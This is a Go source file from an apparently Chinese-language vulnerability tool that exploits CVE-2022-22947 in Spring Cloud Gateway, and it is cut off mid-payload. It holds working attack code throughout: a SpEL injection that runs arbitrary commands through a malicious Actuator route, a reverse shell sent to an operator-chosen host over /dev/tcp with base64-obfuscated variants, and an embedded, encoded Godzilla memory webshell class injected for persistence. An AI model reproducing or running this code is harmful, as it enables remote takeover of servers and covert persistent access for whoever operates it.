package vulns

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
	"vuln-scanner/client"
	cli "vuln-scanner/client"
	"vuln-scanner/common"
	"vuln-scanner/logger"
	"vuln-scanner/utils"
)

// CVE202222947Scanner CVE-2022-22947漏洞扫描器
// 实现Spring Cloud Gateway SpEL远程代码执行漏洞扫描
type CVE202222947Scanner struct {
	statistics ScanStatistics // 扫描统计信息
	startTime  time.Time      // 扫描开始时间
}

// NewCVE202222947Scanner 创建CVE-2022-22947漏洞扫描器
func NewCVE202222947Scanner() *CVE202222947Scanner {
	return &CVE202222947Scanner{}
}

// GetScannerName 获取扫描器名称
func (s *CVE202222947Scanner) GetScannerName() string {
	return "cve_2022_22947_scanner"
}

// GetSupportedVulnerabilities 获取扫描器支持的漏洞类型
func (s *CVE202222947Scanner) GetSupportedVulnerabilities() []string {
	return []string{
		"CVE-2022-22947",
	}
}

// GetScanStatistics 获取扫描统计信息
func (s *CVE202222947Scanner) GetScanStatistics() ScanStatistics {
	// 确保更新扫描持续时间
	if s.statistics.ScanDuration == 0 && !s.startTime.IsZero() {
		s.statistics.ScanDuration = time.Since(s.startTime)
	}
	return s.statistics
}

// ExecuteCommand 执行命令
func (s *CVE202222947Scanner) ExecuteCommand(target string, command string, options ScanOptions) (string, error) {
	// 创建HTTP客户端
	log := options.Logger
	if log == nil {
		log = logger.NewDefaultLogger()
	}

	baseCtx := logger.LogContext{
		Target:      target,
		ScannerName: s.GetScannerName(),
		Timestamp:   time.Now(),
	}

	log.Info("CVE-2022-22947执行命令", baseCtx)

	// 创建HTTP客户端
	clientConfig := cli.HTTPClientConfig{
		Timeout:   time.Duration(options.Timeout) * time.Second,
		Proxy:     options.Proxy,
		SkipSSL:   options.SkipSSL,
		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		Headers:   options.Headers,
		Cookies:   options.Cookies,
	}

	if options.RandomAgent {
		clientConfig.UserAgent = cli.GetRandomUserAgent()
		log.Debug(fmt.Sprintf("使用随机User-Agent: %s", clientConfig.UserAgent), baseCtx)
	}

	client, err := cli.NewHTTPClient(clientConfig)
	if err != nil {
		return "", fmt.Errorf("创建HTTP客户端失败: %w", err)
	}

	// Actuator端点路径
	basePath := "/actuator"
	target = strings.TrimRight(target, "/")

	// 生成随机路由ID
	charSetCfg := utils.DefaultRandomStringConfig()
	charSetCfg.Length = 10
	maliciousRouteID, err := utils.GenerateRandomString(charSetCfg)
	if err != nil {
		return "", fmt.Errorf("生成随机路由ID失败: %w", err)
	}

	// 构造命令执行载荷
	payload := map[string]interface{}{
		"id": maliciousRouteID,
		"filters": []map[string]interface{}{
			{
				"name": "AddResponseHeader",
				"args": map[string]string{
					"name":  "Result",
					"value": `#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec("` + command + `").getInputStream()))}`,
				},
			},
		},
		"uri": "http://example.com",
		"predicates": []map[string]interface{}{
			{
				"name": "Path",
				"args": map[string]string{
					"pattern": "/test",
				},
			},
		},
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return "", fmt.Errorf("序列化载荷失败: %w", err)
	}
	log.LogScanStep("CVE-2022-22947执行命令载荷", map[string]interface{}{
		"command": command,
		"payload": string(jsonData),
	}, baseCtx)
	// 添加恶意路由
	addroute := fmt.Sprintf("%s%s/gateway/routes/%s", target, basePath, maliciousRouteID)
	add_req, err := http.NewRequest("POST", addroute, bytes.NewBufferString(string(jsonData)))
	if err != nil {
		return "", fmt.Errorf("创建添加路由请求失败: %w", err)
	}
	add_req.Header.Set("Content-Type", "application/json")

	add_resp, err := client.Do(add_req)
	if err != nil {
		return "", fmt.Errorf("添加路由失败: %w", err)
	}
	defer add_resp.Body.Close()

	if add_resp.StatusCode != http.StatusCreated {
		return "", fmt.Errorf("添加路由失败，状态码: %d", add_resp.StatusCode)
	}

	// 清理路由
	defer func() {
		deleteURL := fmt.Sprintf("%s%s/gateway/routes/%s", target, basePath, maliciousRouteID)
		deleteReq, err := http.NewRequest("DELETE", deleteURL, nil)
		if err == nil {
			deleteReq.Header.Set("Content-Type", "application/json")
			if deleteResp, err := client.Do(deleteReq); err == nil && deleteResp.Body != nil {
				io.Copy(io.Discard, deleteResp.Body)
				deleteResp.Body.Close()
			}
		}
	}()

	// 刷新路由
	refreshURL := fmt.Sprintf("%s%s/gateway/refresh", target, basePath)
	refreshReq, err := http.NewRequest("POST", refreshURL, nil)
	if err != nil {
		return "", fmt.Errorf("创建刷新路由请求失败: %w", err)
	}
	refreshReq.Header.Set("Content-Type", "application/json")

	refreshResp, err := client.Do(refreshReq)
	if err != nil {
		return "", fmt.Errorf("刷新路由失败: %w", err)
	}
	defer refreshResp.Body.Close()

	if refreshResp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("刷新路由失败，状态码: %d", refreshResp.StatusCode)
	}

	// 访问测试路径，触发命令执行
	getURL := fmt.Sprintf("%s%s/gateway/routes/%s", target, basePath, maliciousRouteID)
	getreq, err := http.NewRequest("GET", getURL, nil)
	if err != nil {
		return "", fmt.Errorf("创建获取命令结果的请求失败: %w", err)
	}
	getreq.Header.Set("Content-Type", "application/json")

	getresp, err := client.Do(getreq)
	if err != nil {
		return "", fmt.Errorf("获取路由失败: %w", err)
	}
	defer getresp.Body.Close()

	if getresp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("获取路由失败，状态码: %d", getresp.StatusCode)
	}

	// 读取响应体
	body, err := io.ReadAll(getresp.Body)
	if err != nil {
		return "", fmt.Errorf("读取响应体失败: %w", err)
	}

	// 读取响应体，获取命令执行结果
	var resultJSON map[string]interface{}
	if err := json.Unmarshal(body, &resultJSON); err != nil {
		return "", fmt.Errorf("解析路由响应失败: %w", err)
	}
	// 获取 filters 字段
	if filters, ok := resultJSON["filters"].([]interface{}); ok && len(filters) > 0 {
		if filterStr, ok := filters[0].(string); ok {
			// 按照单引号分割并获取第二个元素
			parts := strings.Split(filterStr, "'")
			if len(parts) >= 2 {
				result := parts[1]
				log.LogScanStep("CVE-2022-22947执行命令结果", map[string]interface{}{
					"command": command,
					"result":  result,
				}, baseCtx)
				return result, nil
			}
		}
	}

	return "", fmt.Errorf("未找到有效结果")
}

// 支持多种shell的版本
func (s *CVE202222947Scanner) generateReverseShellAdvanced(command string, shellType string) string {
	base64Shell := base64.StdEncoding.EncodeToString([]byte(command))

	switch shellType {
	case "bash":
		return fmt.Sprintf("bash -c 'echo %s | base64 -d | bash -i'", base64Shell)
	case "sh":
		return fmt.Sprintf("sh -c 'echo %s | base64 -d | sh -i'", base64Shell)
	case "original":
		// 原始花括号语法
		return fmt.Sprintf("bash -c {echo,%s}|{base64,-d}|{bash,-i}", base64Shell)
	case "python":
		return fmt.Sprintf("python3 -c \"exec(__import__('base64').b64decode('%s').decode())\"", base64Shell)
	default:
		return fmt.Sprintf("bash -c 'echo %s | base64 -d | bash -i'", base64Shell)
	}
}

// StartReverseShell 启动反弹shell
func (s *CVE202222947Scanner) StartReverseShell(target string, host string, port string, options ScanOptions) (string, error) {
	// 创建HTTP客户端
	log := options.Logger
	if log == nil {
		log = logger.NewDefaultLogger()
	}

	baseCtx := logger.LogContext{
		Target:      target,
		ScannerName: s.GetScannerName(),
		Timestamp:   time.Now(),
	}

	log.Info("CVE-2022-22947启动反弹shell", baseCtx)
	log.LogScanStep("CVE-2022-22947反弹shell参数", map[string]interface{}{
		"host": host,
		"port": port,
	}, baseCtx)

	// client, err := cli.NewHTTPClient(clientConfig)
	client, err := cli.CreateHTTPClient(options.Proxy, options.SkipSSL, options.AllowRedirect, time.Duration(options.Timeout)*time.Second)
	if err != nil {
		return "", fmt.Errorf("创建HTTP客户端失败: %w", err)
	}

	// Actuator端点路径
	basePath := "/actuator"
	target = strings.TrimRight(target, "/")

	// 生成随机路由ID
	charSetCfg := utils.DefaultRandomStringConfig()
	charSetCfg.Length = 10
	maliciousRouteID, err := utils.GenerateRandomString(charSetCfg)
	if err != nil {
		return "", fmt.Errorf("生成随机路由ID失败: %w", err)
	}

	// 构造反弹shell命令，使用nohup和后台执行确保shell持续运行
	// 命令解释：
	// 1. nohup - 忽略挂断信号，使命令在后台持续运行
	// 2. /bin/sh -c - 使用sh代替bash，更加通用
	// 3. /bin/sh -i >& /dev/tcp/%s/%s 0>&1 - 标准的sh反弹shell命令
	// 4. 2>&1 - 重定向错误输出到标准输出
	// 5. & - 将命令放入后台执行

	// shellCommand := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", host, port)
	// shellCommand = s.generateReverseShellAdvanced(shellCommand, "original")

	shellCommand := fmt.Sprintf("new String[]{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/%s/%s 0>&1\"}", host, port)
	log.LogScanStep("CVE-2022-22947反弹shell命令", map[string]interface{}{
		"command": shellCommand,
	}, baseCtx)
	// 构造命令执行载荷
	payload := map[string]interface{}{
		"id": maliciousRouteID,
		"filters": []map[string]interface{}{
			{
				"name": "AddResponseHeader",
				"args": map[string]string{
					"name":  "Result",
					"value": fmt.Sprintf(`#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(%s).getInputStream()))}`, shellCommand),
				},
			},
		},
		"uri": "http://example.com",
		"predicates": []map[string]interface{}{
			{
				"name": "Path",
				"args": map[string]string{
					"pattern": "/test",
				},
			},
		},
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return "", fmt.Errorf("序列化载荷失败: %w", err)
	}

	go func(jsonData []byte) {
		// 添加恶意路由
		addroute := fmt.Sprintf("%s%s/gateway/routes/%s", target, basePath, maliciousRouteID)
		add_req, err := http.NewRequest("POST", addroute, bytes.NewBufferString(string(jsonData)))
		if err != nil {
			log.Error("创建添加路由请求失败", err, baseCtx)
			return
		}
		add_req.Header.Set("Content-Type", "application/json")
		add_req.Header.Set("User-Agent", cli.GetRandomUserAgent())
		log.LogRequest("POST", addroute, utils.HeaderMap(add_req.Header), jsonData, baseCtx)

		_, _ = client.Do(add_req)

		// 刷新路由
		refreshURL := fmt.Sprintf("%s%s/gateway/refresh", target, basePath)
		refreshReq, err := http.NewRequest("POST", refreshURL, nil)
		if err != nil {
			log.Error("创建刷新路由请求失败", err, baseCtx)
			return
		}
		refreshReq.Header.Set("Content-Type", "application/json")
		refreshReq.Header.Set("User-Agent", cli.GetRandomUserAgent())
		log.LogRequest("POST", refreshURL, utils.HeaderMap(refreshReq.Header), nil, baseCtx)

		_, _ = client.Do(refreshReq)

	}(jsonData)
	// 清理路由
	go func() {
		// 等待2秒，确保命令有足够的时间启动
		time.Sleep(2 * time.Second)
		deleteURL := fmt.Sprintf("%s%s/gateway/routes/%s", target, basePath, maliciousRouteID)
		deleteReq, err := http.NewRequest("DELETE", deleteURL, nil)
		if err == nil {
			deleteReq.Header.Set("Content-Type", "application/json")
			deleteReq.Header.Set("User-Agent", cli.GetRandomUserAgent())
			if deleteResp, err := client.Do(deleteReq); err == nil && deleteResp.Body != nil {
				io.Copy(io.Discard, deleteResp.Body)
				deleteResp.Body.Close()
			}
		}
	}()

	return fmt.Sprintf("Shell反弹请求已发送, 请查看你的Netcat监听结果。\n监听地址: %s:%s\n\n提示：\n1. 反弹shell命令已启动\n2. 如果连接成功，你应该能在netcat中看到shell提示符\n3. 请确保你的监听端口是开放的\n", host, port), nil
}

// GetMemoryShellTypes 获取支持的内存马类型
func (s *CVE202222947Scanner) GetMemoryShellTypes() ([]map[string]string, error) {
	return []map[string]string{
		{"value": "godzilla", "label": "哥斯拉内存马"},
	}, nil
}

// InjectMemoryShell 注入内存马
func (s *CVE202222947Scanner) InjectMemoryShell(target string, password string, path string, shellType string, options ScanOptions) (string, error) {
	// 检查shellType是否支持
	if shellType != "godzilla" {
		return "", fmt.Errorf("CVE-2022-22947只支持哥斯拉内存马，不支持: %s", shellType)
	}

	// 创建HTTP客户端
	log := options.Logger
	if log == nil {
		log = logger.NewDefaultLogger()
	}

	baseCtx := logger.LogContext{
		Target:      target,
		ScannerName: s.GetScannerName(),
		Timestamp:   time.Now(),
	}

	log.Info("CVE-2022-22947注入哥斯拉内存马", baseCtx)

	// 创建HTTP客户端
	clientConfig := cli.HTTPClientConfig{
		Timeout:   time.Duration(options.Timeout) * time.Second,
		Proxy:     options.Proxy,
		SkipSSL:   options.SkipSSL,
		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		Headers:   options.Headers,
		Cookies:   options.Cookies,
	}
	if options.RandomAgent {
		clientConfig.UserAgent = cli.GetRandomUserAgent()
		log.Debug(fmt.Sprintf("使用随机User-Agent: %s", clientConfig.UserAgent), baseCtx)
	}

	client, err := cli.NewHTTPClient(clientConfig)
	if err != nil {
		return "", fmt.Errorf("创建HTTP客户端失败: %w", err)
	}

	// Actuator端点路径
	basePath := "/actuator"
	target = strings.TrimRight(target, "/")

	// 生成随机路由ID
	charSetCfg := utils.DefaultRandomStringConfig()
	charSetCfg.Length = 10
	maliciousRouteID, err := utils.GenerateRandomString(charSetCfg)
	if err != nil {
		return "", fmt.Errorf("生成随机路由ID失败: %w", err)
	}

	if !strings.HasPrefix(path, "/") {
		path = fmt.Sprintf("/%s", path)
	}

	// 构造命令执行载荷
	payload := map[string]interface{}{
		"id": maliciousRouteID,
		"filters": []map[string]interface{}{
			{
				"name": "AddResponseHeader",
				"args": map[string]string{
					"name":  "Result",
					"value": fmt.Sprintf(`#{T(org.springframework.cglib.core.ReflectUtils).defineClass('ms.GMemShell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQBeAoADQC2BwC3CgACALYJABIAuAoAAgC5CQASALoKAAIAuwoAEgC8CQASAL0KAA0AvggAcgcAvwcAwAcAwQcAwgoADADDCgAOAMQHAMUIAJ8HAMYHAMcKAA8AyAsAyQDKCgASALYKAA4AywgAzAcAzQoAGwDOCADPBwDQBwDRCgDSANMKANIA1AoAHgDVBwDWCACBBwCECQDXANgKANcA2QgA2goA2wDcBwDdCgAVAN4KACoA3woA2wDgCgDbAOEIAOIKAOMA5AoAFQDlCgDjAOYHAOcKAOMA6AoAMwDpCgAzAOoKABUA6wgA7AoADADtCADuCgAMAO8IAPAIAPEKAAwA8ggA8wgA9AgA9QgA9ggA9wsAFAD4EgAAAP4KAP8BAAcBAQkBAgEDCgBHAQQKABsBBQsBBgEHCgASAQgKABIBCQkAEgEKCAELCwEMAQ0KABIBDgsBDAEPCAEQBwERCgBUALYKAA0BEgoAFQETCgANALsKAFQBFAoAEgEVCgAVARYKAP8BFwcBGAoAXQC2CABlCAEZAQAFc3RvcmUBAA9MamF2YS91dGlsL01hcDsBAAlTaWduYXR1cmUBADVMamF2YS91dGlsL01hcDxMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDs+OwEABHBhc3MBABJMamF2YS9sYW5nL1N0cmluZzsBAANtZDUBAAJ4YwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAOTG1zL0dNZW1TaGVsbDsBAAhkb0luamVjdAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVcmVnaXN0ZXJIYW5kbGVyTWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA5leGVjdXRlQ29tbWFuZAEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAQ0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAANtc2cBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADb2JqAQASTGphdmEvbGFuZy9PYmplY3Q7AQAEcGF0aAEADVN0YWNrTWFwVGFibGUHAM0HAMcBABBNZXRob2RQYXJhbWV0ZXJzAQALZGVmaW5lQ2xhc3MBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAApjbGFzc2J5dGVzAQACW0IBAA51cmxDbGFzc0xvYWRlcgEAGUxqYXZhL25ldC9VUkxDbGFzc0xvYWRlcjsBAAZtZXRob2QBAApFeGNlcHRpb25zAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQABcwEAAW0BAAFaBwDFBwEaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAJicwEABXZhbHVlAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAANjbWQBAF0oTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZTspTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eTsBAAxidWZmZXJTdHJlYW0BAAJleAEABXBkYXRhAQAyTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZTsBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQA1TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9Qb3N0TWFwcGluZzsBAAQvY21kAQANbGFtYmRhJGNtZCQxMQEARyhMb3JnL3NwcmluZ2ZyYW1ld29yay91dGlsL011bHRpVmFsdWVNYXA7KUxyZWFjdG9yL2NvcmUvcHVibGlzaGVyL01vbm87AQAGYXJyT3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAWYBAAJpZAEABGRhdGEBAChMb3JnL3NwcmluZ2ZyYW1ld29yay91dGlsL011bHRpVmFsdWVNYXA7AQAGcmVzdWx0AQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwcAtwEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEADkdNZW1TaGVsbC5qYXZhDABpAGoBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAZQBmDAEbARwMAGgAZgwBHQEeDABnAJIMAGcAZgwBHwEgAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAQW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvDAEhASIMASMBJAEADG1zL0dNZW1TaGVsbAEAMG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZQEAEGphdmEvbGFuZy9TdHJpbmcMASUBKAcBKQwBKgErDAEsAS0BAAJvawEAE2phdmEvbGFuZy9FeGNlcHRpb24MAS4AagEABWVycm9yAQAXamF2YS9uZXQvVVJMQ2xhc3NMb2FkZXIBAAxqYXZhL25ldC9VUkwHAS8MATABMQwBMgEzDABpATQBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHATUMATYAmQwBNwE4AQADQUVTBwEaDAE5AToBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAE7ATwMAGkBPQwBPgE/DAFAAUEBAANNRDUHAUIMATkBQwwBRAFFDAFGAUcBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBSAE8DABpAUkMAR0BSgwBSwEeAQAQamF2YS51dGlsLkJhc2U2NAwBTAFNAQAKZ2V0RW5jb2RlcgwBTgEiAQAOZW5jb2RlVG9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAFPAVABAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBUQFSAQAQQm9vdHN0cmFwTWV0aG9kcw8GAVMQAVQPBwFVEACpDAFWAVcHAVgMAVkBWgEAJ29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eQcBWwwBXAFdDABpAV4MAV8BHgcBYAwBYQFUDACcAJ0MAIkAigwAYQBiAQAHcGF5bG9hZAcBYgwBYwFUDACBAIIMAWQBZQEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBZgFnDAFoAWkMAWoBPAwAlQCWDAFoAUoMAWsBbAEAEWphdmEvdXRpbC9IYXNoTWFwAQAQM2M2ZTBiOGE5YzE1MjI0YQEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAVwYXRocwEAB0J1aWxkZXIBAAxJbm5lckNsYXNzZXMBAGAoW0xqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAElvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAFYnVpbGQBAEUoKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAKShbTGphdmEvbmV0L1VSTDtMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAC2dldEZvcm1EYXRhAQAfKClMcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vOwoBbQFuAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsKABIBbwEABWFwcGx5AQAtKExtcy9HTWVtU2hlbGw7KUxqYXZhL3V0aWwvZnVuY3Rpb24vRnVuY3Rpb247AQAbcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vAQAHZmxhdE1hcAEAPChMamF2YS91dGlsL2Z1bmN0aW9uL0Z1bmN0aW9uOylMcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vOwEAI29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzAQACT0sBACVMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7AQA6KExqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czspVgEACmdldE1lc3NhZ2UBACZvcmcvc3ByaW5nZnJhbWV3b3JrL3V0aWwvTXVsdGlWYWx1ZU1hcAEACGdldEZpcnN0AQANamF2YS91dGlsL01hcAEAA2dldAEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvQnl0ZUFycmF5AQAEanVzdAEAMShMamF2YS9sYW5nL09iamVjdDspTHJlYWN0b3IvY29yZS9wdWJsaXNoZXIvTW9ubzsHAXAMAXEBdAwAqACpAQAiamF2YS9sYW5nL2ludm9rZS9MYW1iZGFNZXRhZmFjdG9yeQEAC21ldGFmYWN0b3J5BwF2AQAGTG9va3VwAQDMKExqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMkTG9va3VwO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvaW52b2tlL01ldGhvZFR5cGU7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTtMamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGU7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTspTGphdmEvbGFuZy9pbnZva2UvQ2FsbFNpdGU7BwF3AQAlamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cAEAHmphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcwAhABIADQAAAAQACQBhAGIAAQBjAAAAAgBkAAkAZQBmAAAACQBnAGYAAAAJAGgAZgAAAAoAAQBpAGoAAQBrAAAALwABAAEAAAAFKrcAAbEAAAACAGwAAAAGAAEAAAAWAG0AAAAMAAEAAAAFAG4AbwAAAAkAcABxAAIAawAAAUgABwAGAAAAkLsAAlm3AAOyAAS2AAWyAAa2AAW2AAe4AAizAAkqtgAKEgsGvQAMWQMSDVNZBBIOU1kFEg9TtgAQTi0EtgAREhISEwS9AAxZAxIUU7YAEDoEBL0AFVkDK1O4ABa5ABcBADoFLSoGvQANWQO7ABJZtwAYU1kEGQRTWQUZBVO2ABlXEhpNpwALTi22ABwSHU0ssAABAAAAgwCGABsAAwBsAAAAMgAMAAAAHQAcAB4AOQAfAD4AIABQACEAYgAiAIAAIwCDACcAhgAkAIcAJQCLACYAjgAoAG0AAABSAAgAOQBKAHIAcwADAFAAMwB0AHMABABiACEAdQB2AAUAgwADAHcAZgACAIcABwB4AHkAAwAAAJAAegB7AAAAAACQAHwAZgABAI4AAgB3AGYAAgB9AAAADgAC9wCGBwB+/AAHBwB/AIAAAAAJAgB6AAAAfAAAAAoAgQCCAAMAawAAAJ4ABgADAAAAVLsAHlkDvQAfuAAgtgAhtwAiTBIjEiQGvQAMWQMSJVNZBLIAJlNZBbIAJlO2ABBNLAS2ABEsKwa9AA1ZAypTWQQDuAAnU1kFKr64ACdTtgAZwAAMsAAAAAIAbAAAABIABAAAAC0AEgAuAC8ALwA0ADAAbQAAACAAAwAAAFQAgwCEAAAAEgBCAIUAhgABAC8AJQCHAHMAAgCIAAAABAABABsAgAAAAAUBAIMAAAABAIkAigACAGsAAADXAAYABAAAACsSKLgAKU4tHJkABwSnAAQFuwAqWbIABrYAKxIotwAstgAtLSu2AC6wTgGwAAEAAAAnACgAGwADAGwAAAAWAAUAAAA1AAYANgAiADcAKAA4ACkAOQBtAAAANAAFAAYAIgCLAIwAAwApAAIAeAB5AAMAAAArAG4AbwAAAAAAKwCNAIQAAQAAACsAjgCPAAIAfQAAADwAA/8ADwAEBwCQBwAlAQcAkQABBwCR/wAAAAQHAJAHACUBBwCRAAIHAJEB/wAXAAMHAJAHACUBAAEHAH4AgAAAAAkCAI0AAACOAAAACQBnAJIAAgBrAAAApwAEAAMAAAAwAUwSL7gAME0sKrYAKwMqtgAxtgAyuwAzWQQstgA0twA1EBC2ADa2ADdMpwAETSuwAAEAAgAqAC0AGwADAGwAAAAeAAcAAAA+AAIAQQAIAEIAFQBDACoARQAtAEQALgBGAG0AAAAgAAMACAAiAI4AkwACAAAAMACNAGYAAAACAC4AlABmAAEAfQAAABMAAv8ALQACBwB